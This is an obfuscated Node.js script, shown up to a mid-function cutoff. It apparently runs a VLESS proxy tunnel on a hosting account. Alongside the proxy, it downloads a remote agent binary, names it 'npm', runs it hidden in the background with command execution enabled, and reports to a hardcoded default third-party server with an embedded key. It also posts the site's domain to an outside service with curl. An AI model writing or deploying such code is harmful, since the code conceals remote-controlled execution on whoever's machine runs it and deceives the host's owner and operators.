const _0x20a18d=_0x2e0e;(function(_0x216faa,_0x53be5e){const _0x545e61=_0x2e0e,_0x2cc3e5=_0x216faa();while(!![]){try{const _0x43d771=parseInt(_0x545e61(0x174))/0x1*(-parseInt(_0x545e61(0xd7))/0x2)+parseInt(_0x545e61(0xf3))/0x3+parseInt(_0x545e61(0x11b))/0x4+parseInt(_0x545e61(0x150))/0x5*(parseInt(_0x545e61(0x10b))/0x6)+parseInt(_0x545e61(0xda))/0x7+-parseInt(_0x545e61(0x132))/0x8+parseInt(_0x545e61(0x16e))/0x9*(-parseInt(_0x545e61(0x12e))/0xa);if(_0x43d771===_0x53be5e)break;else _0x2cc3e5['push'](_0x2cc3e5['shift']());}catch(_0x83a2c2){_0x2cc3e5['push'](_0x2cc3e5['shift']());}}}(_0x1e8b,0xe699b));function _0x1e8b(){const _0x9f3e6d=['http/1.1','processPacket','NEZHA_PORT','Too\x20many\x20buffered\x20packets','nextSeq','writableEnded','=================================','getWriter','uuid','_startDownstreamResponse','destroy','Automatic\x20Access\x20Task\x20added\x20successfully:','Read\x20controller\x20error:','10PYZJUd','fill','headerSent','lastActivity','uncork','Server\x20error:\x20','read\x20vless\x20header\x20error:\x20','Process\x20packet\x20error:\x20','Cleaning\x20up\x20session\x20','forEach','initializeVLESS','Buffered\x20packet\x20seq=','destroyed','length','stream','\x1b[0m','\x1b[33m','Max\x20buffered\x20posts:\x20','socket\x20hang\x20up','resume','reset','bufferedData','Remote\x20error:\x20','Vls','Failed\x20to\x20write\x20to\x20remote:\x20','&path=','https://amd64.ssss.nyc.mn/agent','https://arm64.ssss.nyc.mn/agent','trim','aborted','135ABVGPu','listen','cleaned','cork','Max\x20buffer\x20size:\x20','replaceAll','82573pdvQdr','MAX_BUFFERED_POSTS','toISOString','bytes','catch','TCP_NODELAY','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','get','nzku.fortymenty.eu.org:443','error','includes','LOG_LEVEL','done','Failed\x20to\x20start\x20downstream\x20for\x20session:\x20','remote','NAME','2087','vless://','vlessHeader','socket','config.yaml','npm\x20running\x20error:\x20','Download\x20error:\x20','warn','true','application/octet-stream','npm\x20is\x20running','\x20-p\x20','BUFFER_SIZE','_writeToRemote','pipeTo','startDownstream','Failed\x20to\x20process\x20POST\x20request:\x20','none','finally','Error\x20starting\x20downstream:\x20','POST','SESSION_TIMEOUT','decode',':443?encryption=none&security=tls&sni=','enqueue','pipe','Created\x20new\x20session\x20for\x20POST:\x20','Failed\x20to\x20get\x20IP\x20address:','/bin/bash','message','keepAliveTimeout','toString','join','method','createWriteStream','https://','base64','slice','resp','Client\x20connection\x20closed','connect\x20timeout','log','match','Starting\x20to\x20parse\x20VLESS\x20header','Connection\x20failed:\x20','reduce','floor','npm','write','\x20before\x20initialization','writeHead','constructor','createConnection','\x1b[36m','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','read','Content-Type','SUB_PATH','info','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','36wCLmof','2083','axios','7434609BaUMFY','AUTO_ACCESS','cleanup','data','from','text/plain','unsupported\x20command:\x20','Created\x20new\x20session\x20with\x20UUID:\x20','url','headersSent','concat','244ed4df-0a93-495d-9e11-a1f895e4235a','unlink','debug','Received\x20out\x20of\x20order\x20packet\x20seq=','Cleanup\x20error:\x20','nohup\x20./npm\x20-s\x20','Failed\x20to\x20initialize\x20VLESS\x20connection','size','setNoDelay','currentStreamRes','Processing\x20packet:\x20seq=','split','aarch64',',\x20size=','5070084aWqxsT','\x20bytes','Socket\x20is\x20destroyed','random','getReader','header\x20length\x20too\x20short','env','\x20>/dev/null\x202>&1\x20&','invalid\x20UUID','chmod\x20+x\x20npm','hostname','\x20timed\x20out\x20without\x20downstream','createServer','set','buffer','curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb','bufferSize','pendingBuffers','value','headersTimeout','releaseLock','Remote\x20connection\x20established','writable','reading_done','5248290XyPbeG','alpnProtocol','Error\x20added\x20Task:','Max\x20POST\x20size:\x20','CHUNK_SIZE','Server\x20is\x20running\x20on\x20port\x20','initialized','not\x20enough\x20data\x20to\x20read','Hello,\x20World\x0a','Transform','VLESS\x20connection\x20to\x20','NEZHA_SERVER','readable','curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22','UUID','end','4230200nxYaCy','Failed\x20to\x20initialize\x20VLESS:\x20','XPATH','\x1b[31m','https://amd64.ssss.nyc.mn/v1',']\x20[','Connected\x20to\x20','Session\x20','Session\x20timeout:\x20','MAX_POST_SIZE','downstreamStarted','2053','&mode=packet-up#','responseHeader','--tls','New\x20secure\x20connection\x20using:\x20','utf-8','arm','npm\x20download\x20successfully','1828410WNqZib','2096','push','no-store','3085016jGDSWg','substr','Log\x20level:\x20','https://arm64.ssss.nyc.mn/v1','pause','%2F','delete','Error\x20sending\x20request:','close','Remote\x20connection\x20not\x20available','chunked','arm64','443','port','has','2048','child_process'];_0x1e8b=function(){return _0x9f3e6d;};return _0x1e8b();}const os=require('os'),fs=require('fs'),net=require('net'),http=require('http'),axios=require(_0x20a18d(0xd9)),{Buffer}=require(_0x20a18d(0x101)),{exec,execSync}=require(_0x20a18d(0x142)),UUID=process[_0x20a18d(0xf9)][_0x20a18d(0x119)]||_0x20a18d(0xe5),NEZHA_SERVER=process[_0x20a18d(0xf9)][_0x20a18d(0x116)]||_0x20a18d(0x17c),NEZHA_PORT=process[_0x20a18d(0xf9)][_0x20a18d(0x145)]||'',NEZHA_KEY=process[_0x20a18d(0xf9)]['NEZHA_KEY']||'UsC5sNDciSaNggxJdB3EGSGYS242VT7q',AUTO_ACCESS=process[_0x20a18d(0xf9)][_0x20a18d(0xdb)]||![],XPATH=process[_0x20a18d(0xf9)][_0x20a18d(0x11d)]||UUID[_0x20a18d(0xc0)](0x0,0x8),SUB_PATH=process[_0x20a18d(0xf9)][_0x20a18d(0xd4)]||'sub',DOMAIN=process[_0x20a18d(0xf9)]['DOMAIN']||'',NAME=process[_0x20a18d(0xf9)][_0x20a18d(0x183)]||_0x20a18d(0x167),PORT=process['env']['PORT']||0xbb8,SETTINGS={['UUID']:UUID,['LOG_LEVEL']:_0x20a18d(0xac),[_0x20a18d(0xa7)]:_0x20a18d(0x141),[_0x20a18d(0x11d)]:_0x20a18d(0x137)+XPATH,[_0x20a18d(0x175)]:0x1e,['MAX_POST_SIZE']:0xf4240,['SESSION_TIMEOUT']:0x7530,[_0x20a18d(0x10f)]:0x400*0x400,[_0x20a18d(0x179)]:!![],['TCP_KEEPALIVE']:!![]};function validate_uuid(_0x3ff4f4,_0x4375de){for(let _0x47bbab=0x0;_0x47bbab<0x10;_0x47bbab++){if(_0x3ff4f4[_0x47bbab]!==_0x4375de[_0x47bbab])return![];}return!![];}function concat_typed_arrays(_0x1b496f,..._0x2e5303){const _0x401f71=_0x20a18d;if(!_0x2e5303||_0x2e5303['length']<0x1)return _0x1b496f;let _0x3fd321=_0x1b496f[_0x401f71(0x15d)];for(let _0x568950 of _0x2e5303)_0x3fd321+=_0x568950[_0x401f71(0x15d)];const _0x51bc0a=new _0x1b496f[(_0x401f71(0xce))](_0x3fd321);_0x51bc0a[_0x401f71(0x100)](_0x1b496f,0x0),_0x3fd321=_0x1b496f['length'];for(let _0xb21c67 of _0x2e5303){_0x51bc0a[_0x401f71(0x100)](_0xb21c67,_0x3fd321),_0x3fd321+=_0xb21c67[_0x401f71(0x15d)];}return _0x51bc0a;}function log(_0x5dbe04,..._0x34d5cd){const _0x3e6094=_0x20a18d;if(SETTINGS[_0x3e6094(0x17f)]==='none')return;const _0x1b885c={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x226bc6={'debug':_0x3e6094(0xd0),'info':'\x1b[32m','warn':_0x3e6094(0x160),'error':_0x3e6094(0x11e),'reset':_0x3e6094(0x15f)},_0x5bc64f=_0x1b885c[SETTINGS[_0x3e6094(0x17f)]]||0x1,_0xaff7ec=_0x1b885c[_0x5dbe04]||0x0;if(_0xaff7ec>=_0x5bc64f){const _0x9d4f7e=new Date()[_0x3e6094(0x176)](),_0x10c9dd=_0x226bc6[_0x5dbe04]||_0x226bc6['reset'];console['log'](_0x10c9dd+'['+_0x9d4f7e+_0x3e6094(0x120)+_0x5dbe04+']',..._0x34d5cd,_0x226bc6[_0x3e6094(0x164)]);}}const getDownloadUrl=()=>{const _0x184547=_0x20a18d,_0x22f8e9=os['arch']();return _0x22f8e9===_0x184547(0x12c)||_0x22f8e9===_0x184547(0x13d)||_0x22f8e9===_0x184547(0xf1)?!NEZHA_PORT?_0x184547(0x135):_0x184547(0x16b):!NEZHA_PORT?_0x184547(0x11f):_0x184547(0x16a);},downloadFile=async()=>{const _0x2d0597=_0x20a18d;if(!NEZHA_KEY)return;try{const _0x1fd9fb=getDownloadUrl(),_0x131851=await axios({'method':'get','url':_0x1fd9fb,'responseType':_0x2d0597(0x15e)}),_0x35a0e2=fs[_0x2d0597(0xbd)](_0x2d0597(0xca));return _0x131851[_0x2d0597(0xdd)]['pipe'](_0x35a0e2),new Promise((_0x2e4893,_0x7d6b2f)=>{const _0x403496=_0x2d0597;_0x35a0e2['on']('finish',()=>{const _0x5a7cca=_0x2e0e;console[_0x5a7cca(0xc4)](_0x5a7cca(0x12d)),exec(_0x5a7cca(0xfc),_0x173b93=>{if(_0x173b93)_0x7d6b2f(_0x173b93);_0x2e4893();});}),_0x35a0e2['on'](_0x403496(0x17d),_0x7d6b2f);});}catch(_0x66c369){throw _0x66c369;}},runnz=async()=>{const _0x424f1f=_0x20a18d;await downloadFile();let _0xb07f67='',_0x4815b8='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1c647d=[_0x424f1f(0x13e),'8443',_0x424f1f(0x12f),_0x424f1f(0x184),'2083','2053'];_0xb07f67=_0x1c647d[_0x424f1f(0x17e)](NEZHA_PORT)?_0x424f1f(0x129):'',_0x4815b8=_0x424f1f(0xea)+NEZHA_SERVER+':'+NEZHA_PORT+_0x424f1f(0xa6)+NEZHA_KEY+'\x20'+_0xb07f67+_0x424f1f(0xfa);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2b9813=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x424f1f(0xf0)](':')['pop']():'',_0x432460=new Set([_0x424f1f(0x13e),'8443','2096','2087',_0x424f1f(0xd8),_0x424f1f(0x126)]),_0xcea6cf=_0x432460['has'](_0x2b9813)?_0x424f1f(0xa3):'false',_0x377041='\x0aclient_secret:\x20'+NEZHA_KEY+_0x424f1f(0x17a)+NEZHA_SERVER+_0x424f1f(0xd1)+_0xcea6cf+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x424f1f(0x9f),_0x377041);}_0x4815b8=_0x424f1f(0xd6);}else return;}try{exec(_0x4815b8,{'shell':_0x424f1f(0xb7)}),console[_0x424f1f(0xc4)](_0x424f1f(0xa5));}catch(_0x124496){console['error'](_0x424f1f(0xa0)+_0x124496);}};async function addAccessTask(){const _0x4ee7c3=_0x20a18d;if(AUTO_ACCESS!==!![])return;try{if(!DOMAIN)return;const _0x931010=_0x4ee7c3(0xbe)+DOMAIN,_0x45579d=_0x4ee7c3(0x118)+_0x931010+'\x22}\x27';exec(_0x45579d,(_0x4cde5e,_0x3ad36f,_0x5b64a3)=>{const _0x1b8c6c=_0x4ee7c3;if(_0x4cde5e){console[_0x1b8c6c(0x17d)](_0x1b8c6c(0x139),_0x4cde5e['message']);return;}console['log'](_0x1b8c6c(0x14e),_0x3ad36f);});}catch(_0x3e9d0a){console[_0x4ee7c3(0x17d)](_0x4ee7c3(0x10d),_0x3e9d0a[_0x4ee7c3(0xb8)]);}}function parse_uuid(_0x1f8a55){const _0x1c1dd8=_0x20a18d;_0x1f8a55=_0x1f8a55[_0x1c1dd8(0x173)]('-','');const _0x174382=[];for(let _0x1141a6=0x0;_0x1141a6<0x10;_0x1141a6++){_0x174382['push'](parseInt(_0x1f8a55[_0x1c1dd8(0x133)](_0x1141a6*0x2,0x2),0x10));}return _0x174382;}async function read_vless_header(_0x37b695,_0x4eb7db){const _0x5598c7=_0x20a18d;let _0x2308d5=0x0,_0x1832a8=new Uint8Array(),_0x404f91={'value':_0x1832a8,'done':![]};async function _0x2de5a2(_0x576e11){const _0x5d4c2c=_0x2e0e;if(_0x404f91['done'])throw new Error(_0x5d4c2c(0xf8));const _0x36c43c=_0x576e11-_0x2308d5;if(_0x36c43c<0x1)return;_0x404f91=await read_atleast(_0x37b695,_0x36c43c),_0x2308d5+=_0x404f91['value'][_0x5d4c2c(0x15d)],_0x1832a8=concat_typed_arrays(_0x1832a8,_0x404f91[_0x5d4c2c(0x105)]);}await _0x2de5a2(0x1+0x10+0x1);const _0xe8d3ea=_0x1832a8[0x0],_0x1391de=_0x1832a8[_0x5598c7(0xc0)](0x1,0x1+0x10),_0x102cac=parse_uuid(_0x4eb7db);if(!validate_uuid(_0x1391de,_0x102cac))throw new Error(_0x5598c7(0xfb));const _0x3b0b8d=_0x1832a8[0x1+0x10],_0x58dd24=0x1+0x10+0x1+_0x3b0b8d+0x1+0x2+0x1;await _0x2de5a2(_0x58dd24+0x1);const _0x40c2af=_0x1832a8[0x1+0x10+0x1+_0x3b0b8d],_0x575494=0x1;if(_0x40c2af!==_0x575494)throw new Error(_0x5598c7(0xe0)+_0x40c2af);const _0x5a4016=(_0x1832a8[_0x58dd24-0x1-0x2]<<0x8)+_0x1832a8[_0x58dd24-0x1-0x1],_0x251328=_0x1832a8[_0x58dd24-0x1],_0x2a6fa8=0x1,_0x441293=0x2,_0x2432ba=0x3;let _0x297ff1=-0x1;if(_0x251328===_0x2a6fa8)_0x297ff1=_0x58dd24+0x4;else{if(_0x251328===_0x2432ba)_0x297ff1=_0x58dd24+0x10;else _0x251328===_0x441293&&(_0x297ff1=_0x58dd24+0x1+_0x1832a8[_0x58dd24]);}if(_0x297ff1<0x0)throw new Error('read\x20address\x20type\x20failed');await _0x2de5a2(_0x297ff1);const _0x5deebb=_0x58dd24;let _0x6001a3='';if(_0x251328===_0x2a6fa8)_0x6001a3=_0x1832a8[_0x5598c7(0xc0)](_0x5deebb,_0x5deebb+0x4)['join']('.');else{if(_0x251328===_0x441293)_0x6001a3=new TextDecoder()[_0x5598c7(0xb1)](_0x1832a8['slice'](_0x5deebb+0x1,_0x5deebb+0x1+_0x1832a8[_0x5deebb]));else _0x251328===_0x2432ba&&(_0x6001a3=_0x1832a8[_0x5598c7(0xc0)](_0x5deebb,_0x5deebb+0x10)[_0x5598c7(0xc8)]((_0x464e67,_0x3417c8,_0x46c829,_0x522d1f)=>_0x46c829%0x2?_0x464e67[_0x5598c7(0xe4)](((_0x522d1f[_0x46c829-0x1]<<0x8)+_0x3417c8)[_0x5598c7(0xba)](0x10)):_0x464e67,[])[_0x5598c7(0xbb)](':'));}if(!_0x6001a3){log('error','Failed\x20to\x20parse\x20hostname');throw new Error('parse\x20hostname\x20failed');}return log('info',_0x5598c7(0x115)+_0x6001a3+':'+_0x5a4016),{'hostname':_0x6001a3,'port':_0x5a4016,'data':_0x1832a8['slice'](_0x297ff1),'resp':new Uint8Array([_0xe8d3ea,0x0])};}async function read_atleast(_0x14fe6f,_0x109b0b){const _0x581da9=_0x20a18d,_0xc74cc4=[];let _0x3e6e75=![];while(_0x109b0b>0x0&&!_0x3e6e75){const _0x5753db=await _0x14fe6f[_0x581da9(0xd2)]();if(_0x5753db[_0x581da9(0x105)]){const _0x57ac6f=new Uint8Array(_0x5753db[_0x581da9(0x105)]);_0xc74cc4[_0x581da9(0x130)](_0x57ac6f),_0x109b0b-=_0x57ac6f[_0x581da9(0x15d)];}_0x3e6e75=_0x5753db[_0x581da9(0x180)];}if(_0x109b0b>0x0)throw new Error(_0x581da9(0x112));return{'value':concat_typed_arrays(..._0xc74cc4),'done':_0x3e6e75};}async function parse_header(_0x1b3d23,_0xfe2d3e){const _0x3a7c58=_0x20a18d;log(_0x3a7c58(0xe7),_0x3a7c58(0xc6));const _0x196b81=_0xfe2d3e[_0x3a7c58(0x117)][_0x3a7c58(0xf7)]();try{const _0x2b0c87=await read_vless_header(_0x196b81,_0x1b3d23);return log(_0x3a7c58(0xe7),'VLESS\x20header\x20parsed\x20successfully'),_0x2b0c87;}catch(_0x168fa9){log(_0x3a7c58(0x17d),'VLESS\x20header\x20parse\x20error:\x20'+_0x168fa9[_0x3a7c58(0xb8)]);throw new Error(_0x3a7c58(0x156)+_0x168fa9[_0x3a7c58(0xb8)]);}finally{_0x196b81[_0x3a7c58(0x107)]();}}async function connect_remote(_0x14ae71,_0x22232c){const _0x200068=_0x20a18d,_0x6b7c8c=0x1f40;try{const _0x1664c9=await timed_connect(_0x14ae71,_0x22232c,_0x6b7c8c);return _0x1664c9[_0x200068(0xed)](!![]),_0x1664c9['setKeepAlive'](!![],0x3e8),_0x1664c9[_0x200068(0x103)]=parseInt(SETTINGS[_0x200068(0xa7)])*0x400,log(_0x200068(0xd5),_0x200068(0x121)+_0x14ae71+':'+_0x22232c),_0x1664c9;}catch(_0x1d2d4e){log(_0x200068(0x17d),_0x200068(0xc7)+_0x1d2d4e[_0x200068(0xb8)]);throw _0x1d2d4e;}}function timed_connect(_0x24bd85,_0x448311,_0x32e221){return new Promise((_0x9fabf2,_0x2e362a)=>{const _0x121b5c=_0x2e0e,_0x237225=net[_0x121b5c(0xcf)]({'host':_0x24bd85,'port':_0x448311}),_0x3c9bb7=setTimeout(()=>{const _0x2fb7ed=_0x121b5c;_0x2e362a(new Error(_0x2fb7ed(0xc3)));},_0x32e221);_0x237225['on']('connect',()=>{clearTimeout(_0x3c9bb7),_0x9fabf2(_0x237225);}),_0x237225['on']('error',_0x1adbf7=>{clearTimeout(_0x3c9bb7),_0x2e362a(_0x1adbf7);});});}function pipe_relay(){async function _0x4877dc(_0x5a9c1f,_0x3999f5,_0x1ed1f4){const _0x245e8c=_0x2e0e,_0x779b78=parseInt(SETTINGS[_0x245e8c(0x10f)]);if(_0x1ed1f4[_0x245e8c(0x15d)]>0x0){if(_0x3999f5[_0x245e8c(0xcb)])_0x3999f5[_0x245e8c(0x171)](),_0x3999f5[_0x245e8c(0xcb)](_0x1ed1f4),process['nextTick'](()=>_0x3999f5[_0x245e8c(0x154)]());else{const _0x3a18d0=_0x3999f5['writable'][_0x245e8c(0x14a)]();try{await _0x3a18d0[_0x245e8c(0xcb)](_0x1ed1f4);}finally{_0x3a18d0[_0x245e8c(0x107)]();}}}try{_0x5a9c1f[_0x245e8c(0xb4)]?(_0x5a9c1f[_0x245e8c(0x136)](),_0x5a9c1f['pipe'](_0x3999f5,{'end':!![],'highWaterMark':_0x779b78}),_0x5a9c1f[_0x245e8c(0x163)]()):await _0x5a9c1f[_0x245e8c(0x117)][_0x245e8c(0xa9)](_0x3999f5[_0x245e8c(0x109)],{'preventClose':![],'preventAbort':![],'preventCancel':![],'signal':AbortSignal['timeout'](SETTINGS['SESSION_TIMEOUT'])});}catch(_0x9ee4c6){!_0x9ee4c6[_0x245e8c(0xb8)][_0x245e8c(0x17e)](_0x245e8c(0x16d))&&log(_0x245e8c(0x17d),'Relay\x20error:',_0x9ee4c6[_0x245e8c(0xb8)]);throw _0x9ee4c6;}}return _0x4877dc;}function socketToWebStream(_0xe532a2){let _0x31bf53,_0x40788c;return _0xe532a2['on']('error',_0x5d16da=>{const _0x444490=_0x2e0e;log(_0x444490(0x17d),'Socket\x20error:',_0x5d16da[_0x444490(0xb8)]),_0x31bf53?.[_0x444490(0x17d)](_0x5d16da),_0x40788c?.[_0x444490(0x17d)](_0x5d16da);}),{'readable':new ReadableStream({'start'(_0x346a32){const _0x3eb959=_0x2e0e;_0x31bf53=_0x346a32,_0xe532a2['on'](_0x3eb959(0xdd),_0x2e9b0c=>{const _0x5938cf=_0x3eb959;try{_0x346a32['enqueue'](_0x2e9b0c);}catch(_0x2933fe){log(_0x5938cf(0x17d),_0x5938cf(0x14f),_0x2933fe[_0x5938cf(0xb8)]);}}),_0xe532a2['on']('end',()=>{const _0x17430e=_0x3eb959;try{_0x346a32['close']();}catch(_0x112ec9){log(_0x17430e(0x17d),'Read\x20controller\x20close\x20error:',_0x112ec9[_0x17430e(0xb8)]);}});},'cancel'(){const _0x300a7d=_0x2e0e;_0xe532a2[_0x300a7d(0x14d)]();}}),'writable':new WritableStream({'start'(_0x389109){_0x40788c=_0x389109;},'write'(_0x146378){return new Promise((_0x2ab898,_0x116eb3)=>{const _0x814852=_0x2e0e;if(_0xe532a2[_0x814852(0x15c)]){_0x116eb3(new Error(_0x814852(0xf5)));return;}_0xe532a2[_0x814852(0xcb)](_0x146378,_0x4278f5=>{if(_0x4278f5)_0x116eb3(_0x4278f5);else _0x2ab898();});});},'close'(){const _0x1e572c=_0x2e0e;!_0xe532a2[_0x1e572c(0x15c)]&&_0xe532a2[_0x1e572c(0x11a)]();},'abort'(_0x5ee885){_0xe532a2['destroy'](_0x5ee885);}})};}function relay(_0x22c1f6,_0x1e7394,_0x20d14f,_0x327013){const _0x322e8b=_0x20a18d,_0x2839f2=pipe_relay();let _0x5271d2=![];const _0xad24d5=socketToWebStream(_0x20d14f);function _0x493860(){const _0x4caf4b=_0x2e0e;if(!_0x5271d2){_0x5271d2=!![];try{_0x20d14f[_0x4caf4b(0x14d)]();}catch(_0x5f7f20){!_0x5f7f20[_0x4caf4b(0xb8)]['includes'](_0x4caf4b(0x16d))&&!_0x5f7f20[_0x4caf4b(0xb8)][_0x4caf4b(0x17e)](_0x4caf4b(0x162))&&log(_0x4caf4b(0x17d),_0x4caf4b(0xe9)+_0x5f7f20['message']);}}}const _0x115580=_0x2839f2(_0x1e7394,_0xad24d5,_0x327013['data'])[_0x322e8b(0x178)](_0x4e24fd=>{const _0x7630ff=_0x322e8b;!_0x4e24fd[_0x7630ff(0xb8)]['includes'](_0x7630ff(0x16d))&&!_0x4e24fd[_0x7630ff(0xb8)]['includes'](_0x7630ff(0x162))&&log(_0x7630ff(0x17d),'Upload\x20error:\x20'+_0x4e24fd[_0x7630ff(0xb8)]);})[_0x322e8b(0xad)](()=>{const _0x47992b=_0x322e8b;_0x1e7394[_0x47992b(0x10a)]&&_0x1e7394['reading_done']();}),_0x421ea9=_0x2839f2(_0xad24d5,_0x1e7394,_0x327013[_0x322e8b(0xc1)])[_0x322e8b(0x178)](_0x5c8848=>{const _0x1ab19=_0x322e8b;!_0x5c8848['message'][_0x1ab19(0x17e)](_0x1ab19(0x16d))&&!_0x5c8848[_0x1ab19(0xb8)][_0x1ab19(0x17e)](_0x1ab19(0x162))&&log(_0x1ab19(0x17d),_0x1ab19(0xa1)+_0x5c8848[_0x1ab19(0xb8)]);});_0x421ea9['finally'](()=>_0x115580)[_0x322e8b(0xad)](_0x493860);}function _0x2e0e(_0x49b3b2,_0x28cdfe){const _0x1e8ba7=_0x1e8b();return _0x2e0e=function(_0x2e0e2c,_0x405b3c){_0x2e0e2c=_0x2e0e2c-0x9d;let _0x231901=_0x1e8ba7[_0x2e0e2c];return _0x231901;},_0x2e0e(_0x49b3b2,_0x28cdfe);}const sessions=new Map();class Session{constructor(_0x304386){const _0x55d9f1=_0x20a18d;this[_0x55d9f1(0x14b)]=_0x304386,this[_0x55d9f1(0x147)]=0x0,this[_0x55d9f1(0x125)]=![],this[_0x55d9f1(0x153)]=Date['now'](),this[_0x55d9f1(0x9d)]=null,this['remote']=null,this[_0x55d9f1(0x111)]=![],this[_0x55d9f1(0x128)]=null,this[_0x55d9f1(0x152)]=![],this[_0x55d9f1(0x165)]=new Map(),this['cleaned']=![],this['pendingPackets']=[],this[_0x55d9f1(0xee)]=null,this[_0x55d9f1(0x104)]=new Map(),log('debug',_0x55d9f1(0xe1)+_0x304386);}async[_0x20a18d(0x15a)](_0x217518){const _0x150bea=_0x20a18d;if(this['initialized'])return!![];try{log(_0x150bea(0xe7),'Initializing\x20VLESS\x20connection\x20from\x20first\x20packet');const _0x86358f=new ReadableStream({'start'(_0x73cd9e){const _0x50e47e=_0x150bea;_0x73cd9e[_0x50e47e(0xb3)](_0x217518),_0x73cd9e[_0x50e47e(0x13a)]();}}),_0x40226c={'readable':_0x86358f,'writable':new WritableStream()};return this['vlessHeader']=await parse_header(SETTINGS['UUID'],_0x40226c),log(_0x150bea(0xd5),'VLESS\x20header\x20parsed:\x20'+this[_0x150bea(0x9d)][_0x150bea(0xfd)]+':'+this[_0x150bea(0x9d)][_0x150bea(0x13f)]),this[_0x150bea(0x182)]=await connect_remote(this['vlessHeader'][_0x150bea(0xfd)],this[_0x150bea(0x9d)][_0x150bea(0x13f)]),log(_0x150bea(0xd5),_0x150bea(0x108)),this[_0x150bea(0x111)]=!![],!![];}catch(_0xd02851){return log(_0x150bea(0x17d),_0x150bea(0x11c)+_0xd02851['message']),![];}}async[_0x20a18d(0x144)](_0x10a876,_0x2b7fcc){const _0x55cf58=_0x20a18d;try{this[_0x55cf58(0x104)][_0x55cf58(0x100)](_0x10a876,_0x2b7fcc),log(_0x55cf58(0xe7),_0x55cf58(0x15b)+_0x10a876+',\x20size='+_0x2b7fcc[_0x55cf58(0x15d)]);while(this[_0x55cf58(0x104)][_0x55cf58(0x140)](this[_0x55cf58(0x147)])){const _0x1f8e40=this['pendingBuffers'][_0x55cf58(0x17b)](this['nextSeq']);this[_0x55cf58(0x104)]['delete'](this[_0x55cf58(0x147)]);if(!this['initialized']&&this[_0x55cf58(0x147)]===0x0){if(!await this[_0x55cf58(0x15a)](_0x1f8e40))throw new Error(_0x55cf58(0xeb));this[_0x55cf58(0x128)]=Buffer['from'](this['vlessHeader']['resp']),await this[_0x55cf58(0xa8)](this['vlessHeader']['data']),this[_0x55cf58(0xee)]&&this[_0x55cf58(0x14c)]();}else{if(!this[_0x55cf58(0x111)]){log(_0x55cf58(0xa2),_0x55cf58(0xe8)+_0x10a876+_0x55cf58(0xcc));continue;}await this[_0x55cf58(0xa8)](_0x1f8e40);}this[_0x55cf58(0x147)]++,log('debug','Processed\x20packet\x20seq='+(this[_0x55cf58(0x147)]-0x1));}if(this[_0x55cf58(0x104)][_0x55cf58(0xec)]>SETTINGS[_0x55cf58(0x175)])throw new Error(_0x55cf58(0x146));return!![];}catch(_0x370815){log(_0x55cf58(0x17d),_0x55cf58(0x157)+_0x370815[_0x55cf58(0xb8)]);throw _0x370815;}}[_0x20a18d(0x14c)](){const _0x10adce=_0x20a18d;if(!this[_0x10adce(0xee)]||!this[_0x10adce(0x128)])return;try{const _0x15d888=this[_0x10adce(0xee)][_0x10adce(0x9e)]?.[_0x10adce(0x10c)]||_0x10adce(0x143),_0x162cdd=_0x15d888==='h2';!this[_0x10adce(0x152)]&&(log(_0x10adce(0xe7),'Sending\x20VLESS\x20response\x20header\x20('+_0x15d888+'):\x20'+this['responseHeader']['length']+_0x10adce(0xf4)),this[_0x10adce(0xee)][_0x10adce(0xcb)](this[_0x10adce(0x128)]),this[_0x10adce(0x152)]=!![]);if(_0x162cdd){this[_0x10adce(0xee)][_0x10adce(0x9e)][_0x10adce(0xed)](!![]);const _0x4eaef6=new require('stream')[_0x10adce(0x114)]({'transform'(_0x59eb8e,_0x56e37c,_0x5de567){const _0x2487e8=_0x10adce,_0x1a8ce0=0x4000;for(let _0x3dee95=0x0;_0x3dee95<_0x59eb8e[_0x2487e8(0x15d)];_0x3dee95+=_0x1a8ce0){this[_0x2487e8(0x130)](_0x59eb8e[_0x2487e8(0xc0)](_0x3dee95,_0x3dee95+_0x1a8ce0));}_0x5de567();}});this[_0x10adce(0x182)][_0x10adce(0xb4)](_0x4eaef6)[_0x10adce(0xb4)](this[_0x10adce(0xee)]);}else this[_0x10adce(0x182)]['pipe'](this[_0x10adce(0xee)]);this[_0x10adce(0x182)]['on'](_0x10adce(0x11a),()=>{const _0x18b6cc=_0x10adce;!this[_0x18b6cc(0xee)][_0x18b6cc(0x148)]&&this[_0x18b6cc(0xee)][_0x18b6cc(0x11a)]();}),this[_0x10adce(0x182)]['on'](_0x10adce(0x17d),_0x33ec1a=>{const _0x8b512d=_0x10adce;log(_0x8b512d(0x17d),_0x8b512d(0x166)+_0x33ec1a['message']),!this['currentStreamRes']['writableEnded']&&this[_0x8b512d(0xee)][_0x8b512d(0x11a)]();});}catch(_0x53e1a7){log(_0x10adce(0x17d),_0x10adce(0xae)+_0x53e1a7[_0x10adce(0xb8)]),this['cleanup']();}}[_0x20a18d(0xaa)](_0x4a8aa6,_0x1f2fb5){const _0x378b49=_0x20a18d;return!_0x4a8aa6[_0x378b49(0xe3)]&&_0x4a8aa6[_0x378b49(0xcd)](0xc8,_0x1f2fb5),this[_0x378b49(0xee)]=_0x4a8aa6,this[_0x378b49(0x111)]&&this[_0x378b49(0x128)]&&this['_startDownstreamResponse'](),_0x4a8aa6['on'](_0x378b49(0x13a),()=>{const _0x44e4ca=_0x378b49;log('info',_0x44e4ca(0xc2)),this['cleanup']();}),!![];}async[_0x20a18d(0xa8)](_0x33c6d3){const _0x30ee2b=_0x20a18d;if(!this[_0x30ee2b(0x182)]||this['remote']['destroyed'])throw new Error(_0x30ee2b(0x13b));return new Promise((_0x11a4db,_0x150e50)=>{const _0x2526eb=_0x30ee2b;this['remote'][_0x2526eb(0xcb)](_0x33c6d3,_0x37bb11=>{const 